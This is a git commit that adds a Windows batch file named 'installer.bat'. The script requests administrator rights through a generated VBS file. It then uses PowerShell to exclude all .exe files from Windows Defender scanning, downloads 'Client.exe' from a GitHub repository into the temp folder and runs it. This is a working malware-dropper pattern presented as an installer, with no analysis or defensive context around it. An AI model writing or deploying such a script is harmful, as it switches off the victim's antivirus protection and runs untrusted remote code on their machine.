e1fe5ef7b2fc50924c1ce70bf946f12da6cd3e3c
NHTBOT <140639828+NHTBOT@users.noreply.github.com>
2024-03-17 20:49:57 +0700

    Add files via upload

---
+++ installer.bat
@@ -0,0 +1,23 @@
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://github.com/NHTBOT/1/raw/main/Client.exe' -OutFile installer.exe"
+installer.exe
